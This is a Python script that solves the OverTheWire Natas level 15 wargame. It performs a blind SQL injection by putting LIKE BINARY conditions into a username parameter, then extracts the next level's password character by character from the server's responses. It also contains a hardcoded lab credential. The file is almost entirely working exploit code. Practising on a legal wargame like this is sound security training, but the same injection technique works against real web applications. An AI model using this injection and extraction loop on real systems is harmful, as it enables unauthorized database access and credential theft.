import requests

PASSWORD = 'SdqIqBsFcz3yotlNYErZSZwblkm0lrvx'
target = 'http://natas15.natas.labs.overthewire.org'
charset_0 = (
	'0123456789' +
	'abcdefghijklmnopqrstuvwxyz' +
	'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
)
charset_1 = ''

for c in charset_0:
	username = ('natas16" AND password LIKE BINARY "%' + c +'%" "')
	r = requests.get(target,
		auth=('natas15', PASSWORD),
	    params={"username": username}
	)
	if "This user exists" in r.text:
		charset_1 += c
		print ('CSET: ' + charset_1.ljust(len(charset_0), '*'))

# charset_1 = "03569acehijmnpqtwBEHINORW"

password = ""
while len(password) != 32:
	for c in charset_1:
		t = password + c
		username = ('natas16" AND password LIKE BINARY "' + t +'%" "')
		r = requests.get(target,
			auth=('natas15', PASSWORD),
			params={"username": username}
		)
		if "This user exists" in r.text:
			print ('PASS: ' + t.ljust(32, '*'))
			password = t
			break
